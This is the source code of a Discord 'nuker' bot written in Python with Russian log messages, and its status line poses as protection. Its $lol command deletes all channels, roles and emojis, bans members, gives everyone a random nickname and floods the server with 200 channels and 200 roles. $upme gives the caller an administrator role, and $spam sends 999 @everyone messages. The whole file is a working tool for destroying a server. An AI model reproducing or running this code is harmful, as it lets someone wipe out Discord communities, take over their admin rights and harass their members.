import discord, os, sys, random, string, requests
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name
init()

if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$', intents=intents )

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}

  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|

{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")

@client.command()
async def lol(ctx):
    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
    await ctx.guild.edit(name="Концерт фейса")
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
    
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    for member in ctx.guild.members:
        try:
            ban += 1
            await member.ban()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Усе, кого мох забанил, а мог я:{ban} человек{Fore.WHITE}.")
    
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        else:
            break
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
    
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        await ctx.guild.create_text_channel("CRASH9D")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам ролями")
    for a in range(200):
        await ctx.guild.create_role(name="BABABOOEY")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
    
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
   
@client.command()
async def upme(ctx, pos: int):
    try:
        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
        await role.edit(position=pos, reason="Админ идиот")
        await ctx.message.author.add_roles(role)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")

@client.command()
async def delroles(ctx):
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
      if ctx.guild.me.roles[-1] > role:
          await role.delete()
          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
      else:
          break
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")

@client.command()
async def spam(ctx):
    await ctx.message.delete()
    for s in range(999):
        await ctx.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")
    


try:
    client.run('токен сюда')
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
